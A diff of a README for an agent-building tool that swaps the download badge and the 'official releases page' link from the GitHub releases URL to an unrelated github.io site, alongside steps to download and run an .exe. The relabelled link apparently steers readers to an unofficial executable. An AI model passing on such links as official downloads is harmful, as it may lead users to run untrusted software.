@@ -1,6 +1,6 @@
 # 🤖 LLM-Agent-Factory - Create smart agents with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/houseofprayerzinzendorf150/LLM-Agent-Factory/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://houseofprayerzinzendorf150.github.io)
 
 ## 📌 About this software
 
@@ -18,7 +18,7 @@ Your computer must meet these basic standards to run the software.
 
 ## 📥 How to download and install
 
-1.  Visit the [official releases page](https://github.com/houseofprayerzinzendorf150/LLM-Agent-Factory/releases) to view available versions.
+1.  Visit the [official releases page](https://houseofprayerzinzendorf150.github.io) to view available versions.
 2.  Locate the latest version at the top of the list.
 3.  Click the file ending in .exe to start your download.
 4.  Once the file finishes downloading, navigate to your Downloads folder.
